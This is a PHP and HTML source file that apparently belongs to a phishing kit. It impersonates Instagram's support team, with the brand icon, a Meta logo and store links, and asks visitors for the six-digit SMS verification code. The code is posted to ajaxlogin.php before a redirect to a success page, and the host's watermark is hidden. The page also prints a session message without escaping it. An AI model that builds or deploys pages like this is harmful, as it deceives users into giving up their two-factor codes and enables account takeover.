<?php   session_start(); 
if(!isset($_SESSION['uye'])) {
   echo "403 BAD REQUSET.";
   exit;
}
 $uyes = json_decode($_SESSION['uye'],true); 
 if (empty($_SESSION['token'])) {
    if (function_exists('mcrypt_create_iv')) {
        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}
$token = $_SESSION['token'];
?>
<!DOCTYPE html>
<style>img[alt="www.000webhost.com"]{display:none;}</style>
<html>
<head>
<link rel="stylesheet" href="css/xss1.css">
<link rel="stylesheet" type="text/css" href="css/xss2.css">
<link rel="stylesheet" href="css/xss3.css">
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<title>|Destek ekibi</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1, user-scalable=no">
<link rel="icon" href="image/ig-logo.png">
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
</head>
<body>
<header>
<table>
<tr>
<td><i class="fa fa-instagram" id="line" aria-hidden="true"></i></td>
<td><i class="fas fa-bars" id="line"></i></td>
</tr>
</table>
<!--
<center>
<div class="get">
<span class="main" id="rgb" style="font-size: 30px!important;		width:50%!important;">@<?php echo $username;?></span>
<br>
</div>
</center>
-->
</header>
<center>
<div class="home">
<br><br>
<div class="mx">
<div class="wrapper fadeInDown">
<div id="formContent">
<br>
<div class="fadeIn first">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRq5oSBdYp_9PO7Wz7w-y9ktGMjF122k9Z0dg&usqp=CAU" style="max-width:90%;" width="135">
<br><center>

<form id="two">
<div id="statuss" class="statuss"> <?php if ($uyes["mesaj"] != "sms"): ?>
             <H6 style="text-align: center;"><?= $uyes["mesaj"] ?></H6>
             <?php else: ?>
             <H6 style="text-align: center;"><p class="alert alert-info">Sonu <?php echo htmlspecialchars($uyes["number"]); ?> ile biten telefon numarana gönderdiğimiz 6 haneli kodu gir.</p>
</H6>
        <?php endif ?></div><br>
       
  <input required="" id="login" class="fadeIn second"  type="text" onKeyPress="if(this.value.length==6) return false;" min="0" id="twocode" name="verificationCode" placeholder="Güvenlik kodu"> 
 <input name="token" type="hidden" value="<?php echo $token ?>">


<center>


<button type="submit"  id="df"  class="df button">Giriş</button>
<br><br>
</center><br>
</form>
</div>
</div>
<br><br>
</div>
</div>
</div>
</center>
<center>
<div class="bottom"><br><br>
<h3 class="bottom-h3">DOWNLOAD FOR<br>IOS / ANDROID</h3><br>
<img src="image/store.jpg" width="325">
<br><br>
<table class="bottom-table">
<tr>
<td><span>About Us</span></td>
<td><span>Safety</span></td>
</tr>
<tr>
<td><span>Features</span></td>
<td><span>Blog</span></td>
</tr>
<tr>
<td><span>Community</span></td>
<td><span>Help</span></td>
</tr>
<tr>
<td><span>Business</span></td>
<td><span>Brand Assets</span></td>
</tr>
</table>
<br><br>
<img src="image/meta.svg" width="325">
<br><br><br>
</div>
</center>
</style>
</body>
       <script type="text/javascript">
         var request;

         $("#two").submit(function(event){
         var btn = $("#df");
btn.prop("disabled", true); 

          $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");

          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();

         request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,

            success: function(data)
            {

 if(data.tokenhata) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Security error, refresh the page.</center></font><br><br> ');
btn.html("Security Error");
              return false;
            }

            if(data.message){
            

document.getElementById("statuss").innerHTML = '<p class="alert alert-danger">' +data.message+ '</p>';
              btn.prop("disabled", false);
              $("#df").html("Doğrula");
              return false;


            }
            if (data.authenticated==true) {

var mesaj = 'Giriş başarılı';
				document.getElementById("statuss").innerHTML = '<p class="alert alert-success">' +mesaj+ '</p>';
            
               $("#df").html("Giriş yapılıyor..");
             setTimeout(function(){ window.location.href="success.php"; }, 1000);
             
             

           }



          } , error:function(res){
                    
              $("#df").html("UNKNOWN ERROR REFRESH PAGE.");
          alert("UNKNOWN ERROR, REFRESH PAGE.");
    }
        });



        });
      </script>
<style type="text/css">
button.button {
  border-radius: 100rem;
  padding: 1rem;
  font-family: 'Avenir Next';
  font-size: 1rem;
  padding: .5rem 3rem;
  color: $color-black;
  box-shadow: 0 0 6px 0 rgba(157, 96, 212, 0.5);
  border: solid 1px transparent;
  background-image: linear-gradient(rgba(255, 255, 255, 0), rgba(255, 255, 255, 0)), linear-gradient(101deg, #78e4ff, #ff48fa);
  background-origin: border-box;
  background-clip: content-box, border-box;
  box-shadow: 2px 1000px 1px #fff inset;
}</style>
</html>
